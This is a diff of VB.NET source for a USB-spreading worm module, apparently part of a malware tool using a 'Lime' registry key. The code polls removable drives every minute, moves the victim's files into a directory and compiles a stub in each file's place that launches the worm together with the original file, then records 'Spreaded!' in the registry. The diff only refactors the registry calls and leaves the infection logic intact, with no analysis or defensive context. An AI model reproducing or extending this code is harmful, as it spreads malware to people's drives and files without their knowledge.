@@ -18,10 +18,8 @@ Public Class USB_SP
     Shared Sub StartSP()
 
         Try
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
-            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing) Is Nothing Then
-                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
-                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "USB", "Not yet")
+            If GTV("USB") = Nothing Then
+                STV("USB", "Didn't spread yet..")
             Else
             End If
         Catch ex As Exception
@@ -33,6 +31,7 @@ Public Class USB_SP
     Shared Sub SI()
 RE:
         Thread.Sleep(60 * 1000)
+
         For Each Drivers In GetDrives()
             Try
                 If Drivers.DriveType = 2 Then
@@ -70,7 +69,7 @@ RE:
                                     IO.File.Move(Files, P & Directory & "\" & GetFileName(Files))
                                 Catch : End Try
                                 Compile(Stub.Replace("%A%", Directory & "\" & Worm).Replace("%B%", Directory & "\" & GetFileName(Files)).Replace("%C%", M), Files, EX, True)
-                                Try : My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "USB", "Spreaded!") : Catch : End Try
+                                Try : STV("USB", "Spreaded!") : Catch : End Try
                             End If
                         Else
                             Dim EX = IC(GetExtension(Files).ToLower, Files)
@@ -78,7 +77,6 @@ RE:
                                 IO.File.Move(Files, P & Directory & "\" & GetFileName(Files))
                             Catch : End Try
                             Compile(Stub.Replace("%A%", Directory & "\" & Worm).Replace("%B%", Directory & "\" & GetFileName(Files)).Replace("%C%", M), Files, EX, True)
-                            Try : My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "USB", "Spreaded!") : Catch : End Try
                         End If
                     End If
                 Catch : End Try
@@ -90,7 +88,6 @@ RE:
                     If Not GetFileName(P) = Directory Then
                         Move(Directorys, P & Directory & "\" & GetFileName(Directorys))
                         Compile(Stub.Replace("%A%", Directory & "\" & Worm).Replace("%B%", Directory & "\" & GetFileName(Directorys)).Replace("%C%", M), Directorys, Nothing, False)
-                        Try : My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "USB", "Spreaded!") : Catch : End Try
                     End If
                 End If
             Catch : End Try
